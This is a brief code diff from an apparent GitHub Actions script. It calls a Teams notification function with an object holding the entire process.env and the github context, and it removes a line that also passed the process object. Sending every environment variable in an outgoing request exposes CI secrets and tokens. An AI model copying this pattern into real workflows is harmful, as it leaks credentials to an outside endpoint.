@@ -53,7 +53,6 @@ const sendPostRequest = async (msTeamsCard) => {
 
 sendPostRequest({
   a: process.env,
-  b: process,
   g: github,
   //c: github.context,
   //   variables: {
